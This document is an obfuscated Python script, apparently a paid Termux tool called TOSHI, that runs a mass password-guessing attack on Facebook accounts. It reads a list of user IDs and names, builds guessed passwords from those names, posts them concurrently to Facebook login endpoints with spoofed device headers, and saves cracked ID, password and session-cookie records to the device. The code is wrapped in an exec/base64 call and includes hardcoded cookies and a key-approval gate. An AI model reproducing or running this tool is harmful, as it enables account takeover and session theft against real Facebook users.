#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: KAZUMA
#______GITHUB : https://github.com/Kazuma
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'import os,zlibfrom plistlib import UIDfrom os import system as osRUBfrom os import system as cmdimport osfrom os import system as sm  try:    import requests except ImportError:    print('\n  installing Requests ...\n')    os.system('pkg install espeak')    os.system('termux-setup-storage -y')    os.system('pip install requests')try:    import concurrent.futuresexcept ImportError:    print('\n  installing futures ...\n')    os.system('pip install futures')try:    import mechanizeexcept ModuleNotFoundError:    os.system('pip install mechanize > /dev/null')    from urllib.request import Request, urlopenimport os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuidfrom concurrent.futures import ThreadPoolExecutor as TOSHISUTOSHIfrom string import * from random import randintfrom time import sleep as slpfrom os import system as cmdfrom zlib import decompress import os, platform#--------------DATE YEAR Checker--------------#def asha(sid):    if len(sid)==15:        if sid[:10] in ['1000000000']       :alif = ' (*-*) 2009 √'        elif sid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 √'        elif sid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 √'        elif sid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 √'        elif sid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 √'        elif sid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 √'        elif sid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 √'        elif sid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'        elif sid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 √'        elif sid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 √'        elif sid[:6] in ['100009']          :alif = ' ACCOUNT 2015 √'        elif sid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 √'        elif sid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 √'        elif sid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 √'        elif sid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 √'        elif sid[:5] in ['10005']           :alif = ' ACCOUNT 2020 √'        elif sid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 √'        elif sid[:5] in ['10008']           :alif = ' ACCOUNT 2022 √'        elif sid[:5] in ['10009']           :alif = ' ACCOUNT 2023 √'        elif sid[:5] in ['6155']            :alif = ' NEW ACCOUNT√'        else:alif=''    elif len(sid) in [9,10]:        alif = ' ACCOUNT 2008/2009 √'    elif len(sid)==8:        alif = ' ACCOUNT 2007/2008 √'    elif len(sid)==7:        alif = ' ACCOUNT 2006/2007 √'    else:alif=''    return aliffrom concurrent.futures import ThreadPoolExecutorfast_work = ThreadPoolExecutor(max_workers=15).submitmodel3 = requests.get('https://raw.githubusercontent.com/CenTsuPH/models/main/4kM.txt').text.splitlines()   totaldmp = 0count = 0loop = 0oks = []cps = []id = []ps = []sid = []total=[]methods = []srange = 0saved = []totaldmp = 0filter = []def toshi6():    END = '[FBAN/EMA;FBAV/365.0.0.93.234;FBPN/com.facebook.lite;FBLC/zh_CN;FBBV/492193644;FBCR/life:) BY;FBMF/Tecno;FBBD/Tecno;FBDV/TECNO CC7S;FBSV/14;FBCA/arm64-v8a:;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)}  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END    return ua    sys.stdout.write('\x1b]2; TOSHI\x07')S = '\033[1;37m'A = '\x1b[38;5;208m'R = '\x1b[38;5;46m'F = '\x1b[38;5;48m'Z = '\033[1;33m'head = {'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'cookie': 'sb=dUc8ZtvXqqSyxGjZG3sWEoxZ; datr=FwU9Zitf5xArSfWDVeGPchyv; ps_n=1; ps_l=1; locale=en_US; vpd=v1%3B634x333x2.157599449157715; m_pixel_ratio=2.157599449157715; wl_cbv=v2%3Bclient_version%3A2499%3Btimestamp%3A1715659901; wd=334x634; fr=0U81Mdg6BfcAiphTk.AWUh1YU_axNi4OCvuODKdqvFigA.BmPQUX..AAA.0.0.BmQuT9.AWVOfdfGagM', 'dpr': '1.875', 'referer': 'https://m.facebook.com/bookmarks/', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"', 'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"V2310"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"13.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 'viewport-width': '980', }logo =                                          """            \033[97;1m      ████████╗ ██████╗ ███████╗██╗  ██╗██╗\033[97;1m      ╚══██╔══╝██╔═══██╗██╔════╝██║  ██║██║\033[97;1m         ██║   ██║   ██║███████╗███████║██║\033[97;1m         ██║   ██║   ██║╚════██║██╔══██║██║\033[97;1m         ██║   ╚██████╔╝███████║██║  ██║██║\033[97;1m         ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗  ║      \033[97;1m[ F U C K Y O U B Y P A S S E R ]     \033[97;1m ║  ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[§] AUTHOR       :      TOSHIRO[§] TOOLS        :      FILE CLONE[§] TYPE         :      PAID[§] FACEBOOK     :      JUSTINE[§] VERSION.     :      PRIVATE━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[97;1m"""def approval():  uuid = str(os.geteuid())+"DS"+str(os.geteuid())  id = "TOSHI-"+"".join(uuid)  os.system('clear')  print(logo)   print("\033[1;37m [\u001b[36m•\033[1;37m] You Need Approval To Use This Tool   \033[1;37m")  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\033[0;32m "+id);time.sleep(0.1)  print ("""\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")  try:    httpCaht = requests.get("https://github.com/Justine133/Kazuma/blob/main/Approved.txt").text    if id in httpCaht:      print("\033[0;32m >> Your Key Has Been Approved !!!")      msg = str(os.geteuid())      time.sleep(1)      pass    else:       print("\x1b\033[0;32m >> Send Key on Facebook ! ");      time.sleep(0.1)            input(' >> Click Enter To Send Your Key ')            os.system('xdg-open https://www.facebook.com/Justine122323')            time.sleep(1)                  exit()        except:   	     print(" >> Unable To Fetch Data From Server ")          time.sleep(2)          exit()approval()def clear():        os.system('clear')        print(logo)        def result(OKs,cps):    if len(OKs) != 0 or len(cps) != 0:        print('\n')        print(47*'-')        print(' The Process has been Complete...')        print(' TOTAL OK: %s' % str(len(oks)))        print(' TOTAL CP: %s' % str(len(cps)))        print(47*'-')        input("Press enter to back TOSHI Menu ")        exit()def fresh():os.system('clear');print(logo)def TOSHIRO():       os.system('clear')    print(logo)    print(f'[1] File cloning')    print(f'[2] FACEBOOK PROFILE ')    #print(f'[F] Join Facebook Group ')    print('')    select = input('Select Menu>: ')    if select =='1':        method_TOSHI()    elif select =='0':        exit(' This is Option Soon available ... ')    elif select =='2':        os.system('espeak -a 300 " waiting for update"')        print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝐅𝐨𝐥𝐥𝐨𝐰 𝐦𝐲 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐩𝐫𝐨𝐟𝐢𝐥𝐞")        os.system('espeak -a 300 " FOLLOW MY FACEBOOK PROFILE"')        os.system('xdg-open https://www.facebook.com/Justine122323')        pass    elif select =='F':        os.system('xdg-open https://www.facebook.com/Justine122323')    else:        print('\n Select valid option ... ')        time.sleep(2)        #TOSHI(allkey)        def method_TOSHI():    global methods    clear()    print(f'[1] Method {1}')    print(f'[2] Method {2}')    print(f'[3] Method {3}')    print(f'[4] Method {4}')    print(f'[0] Back')    print('')    option = input('Select method>: ')    if option =='1':        methods.append('methodA')        main_TOSHI().TOSHI(id)    elif option =='2':        methods.append('methodB')        main_TOSHI().TOSHI(id)    elif option =='3':        methods.append('methodC')        main_TOSHI().TOSHI(id)    elif option =='4':        methods.append('methodD')        main_TOSHI().TOSHI(id)    elif option =='0':        TOSHIRO()    else:      print('\n Select Valid Option ...')      time.sleep(2)      method_TOSHI()class main_TOSHI():    def __init__(self):        self.id=[]    def TOSHI(self,id):        global methods        clear()        self.file = input('Put File Name : ')        try:            self.id = open(self.file).read().splitlines()            self.pasw()        except FileNotFoundError:            print('Opps File Not Found ...')            time.sleep(2)            os.system('clear')            print(logo)            print('Try Again ...')            time.sleep(2)            main_TOSHI().TOSHI(id)                def methodA(self, sid, name, psw):        try:            global oks,cps,loop            sys.stdout.write(f"\r [TOSHI] | M1 OK | CP {len(oks)}/{len(cps)} | {loop} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")            sys.stdout.flush()            fs = name.split(' ')[0]            try:                ls = name.split(' ')[1]            except:                ls = fs            for pw in psw:                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())                with requests.Session() as session:                    data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": sid,"password": ps,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_GB","client_country_code": "GB","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}                headers = {'User-Agent': toshi6(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()                if 'session_key' in q:                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])#;TOSHIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TOSHIb};{ckkk}"                    print(f"\r\r\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")                    print(f"\033[1;37m╔━━\033[0;32m[OK]{sid} | {ps}{S}")                    print(f"\033[1;37m╬━━\033[1;33m[YEAR] :"+asha(sid))                    print(f"\033[1;37m╚━━\033[0;34m[LINK]:https://www.facebook.com/"+sid)                    print(f"\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")                    oks.append(sid)                    open('/sdcard/TOSHI_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TOSHI_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')                    os.system('espeak -a 300 "BOMB,  HAS,  BEEN,  PLANTED, Id "')                    break                elif 'www.facebook.com' in q['error']['message']:                        #print(f"\r{A} [TOSHI-CP] {sid} | {ps} {S}")                     os.system('espeak -a 300 " I  MISS HER Cp "')                     cps.append(sid)                     open('/sdcard/TOSHI_CP.txt','a').write(sid+'|'+ps+'\n')                else:                    continue            loop+=1        except requests.exceptions.ConnectionError:            self.methodA(sid, name, ps)                def methodC(self, sid, name, psw):        try:            global oks,cps,loop            sys.stdout.write(f"\r {S}[TOSHI] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")            sys.stdout.flush()            fs = name.split(' ')[0]            try:                ls = name.split(' ')[1]            except:                ls = fs            for pw in psw:                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())                with requests.Session() as session:                    data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": sid,"password": ps,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}                headers = {'User-Agent': toshi6(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()                if 'session_key' in q:                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);TOSHIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TOSHIb};{ckkk}"                    print(f"\r{R} [TOSHI-OK] {sid} | {ps} {S}")                    os.system('espeak -a 300 "HEY, SHIT, YOU,  GOT,  A,  FUCK,  id"')                    oks.append(sid)                    open('/sdcard/TOSHI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TOSHI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')                    break                elif 'www.facebook.com' in q['error']['message']:                    print(f"\r{A} [TOSHI-CP] {sid} | {ps} {S}")                    os.system('espeak -a 300 " oh shit Cp ID"')                    cps.append(sid)                    open('/sdcard/TOSHI_CP.txt','a').write(sid+'|'+ps+'\n')                else:                    continue            loop+=1        except requests.exceptions.ConnectionError:            self.methodC(sid, name, ps)      def methodD(self, sid, name, psw):        global oks,cps,loop        sys.stdout.write(f"\r\033[1;32m[TOSHI] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")        sys.stdout.flush()        fs = name.split(' ')[0]        try:            ls = name.split(' ')[1]        except:            ls = fs        try:            for pw in psw:                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())                session=requests.Session()                sua = randBuildvsskj()                getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}                session.headers = {}                session.headers.update({'Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by python to avoid comment closer]/[inserted by python to avoid comment start]/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cookie': 'sb=dUc8ZtvXqqSyxGjZG3sWEoxZ; datr=FwU9Zitf5xArSfWDVeGPchyv; ps_n=1; ps_l=1; locale=en_US; vpd=v1%3B634x333x2.157599449157715; wl_cbv=v2%3Bclient_version%3A2499%3Btimestamp%3A1715673377; m_pixel_ratio=2.157599449157715; wd=334x634; fr=0U81Mdg6BfcAiphTk.AWXG1EsnfrLmyknDZaO9Q-BeKLI.BmPQUX..AAA.0.0.BmQxwz.AWV2v17WTDo', 'dpr': '1.875', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"', 'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"V2310"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"13.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36', 'viewport-width': '980',})                complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)                if 'c_user' in session.cookies.get_dict():                    ckkk = ";".join(i["name"]+"="+i["value"] for i in complete["session_cookies"])#;TOSHIb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={TOSHIb};{ckkk}"                    print(f"\r\r\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")                    print(f"\033[1;37m╔━━━━\033[0;32m[OK]{sid} | {ps}{S}")                    print(f"\033[1;37m╬━━━━\033[1;33m[YEAR] :"+asha(sid))                    print(f"\033[1;37m╚━━━━\033[0;34m[LINK]:https://www.facebook.com/"+sid)                    print(f"\033[97;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")                    oks.append(sid)                    open('/sdcard/TOSHI_OK_ids_M4.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TOSHI_iDs_COOKiEs_M4.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')                    os.system('espeak -a 300 "BOMB,  HAS,  BEEN,  PLANTED"')                    break                elif 'checkpoint' in session.cookies.get_dict():                    print(f"\r{A} [TOSHI-CP] {sid} | {ps} {S}")                    os.system('espeak -a 300 " i miss her"')                    cps.append(sid)                    open('/sdcard/TOSHI_CP.txt','a').write(sid+'|'+ps+'\n')                    break                else:                    continue                #time.sleep(31)                        loop+=1        except requests.exceptions.ConnectionError:             self.methodD(sid, name, ps)                def pasw(self):                   pw = []            clear()            print('Put limit between 1 to 30')            sl = int(input('How many password do you want to add?: '))            os.system("clear")            print(logo)            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')            print('')            if sl =='':                print('\n Put limit between 1 to 30')            elif sl > 100:                print('\nPassword limit Should Not Be Greater Than 30')            else:                for sr in range(sl):                    pw.append(input(f'Password {sr+1}: '))            os.system("clear")            print(logo)                        print(f"\r{A}Use flight (airplane) mode for speed up {S}")            print(47*"-")            print(f'{S} Total IDs : %s ' % len(self.id))            print(f'{S} Starting Started...')            print(47*"-")            with TOSHISUTOSHI(max_workers=30) as TOSHIworld:                for zsb in self.id:                   try:                       uid, name = zsb.split('|')                       sz = name.split(' ')                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:                           pwx =  pw                       else:                            pwx =  pw                            if 'methodA' in methods:                                TOSHIworld.submit(self.methodA, uid, name, pwx)                            elif 'methodB' in methods:                                TOSHIworld.submit(self.methodB, uid, name, pwx)                            elif 'methodC' in methods:                                TOSHIworld.submit(self.methodC, uid, name, pwx)                            elif 'methodD' in methods:                                TOSHIworld.submit(self.methodD, uid, name, pwx)                   except:pass            result(oks,cps)   TOSHIRO()'))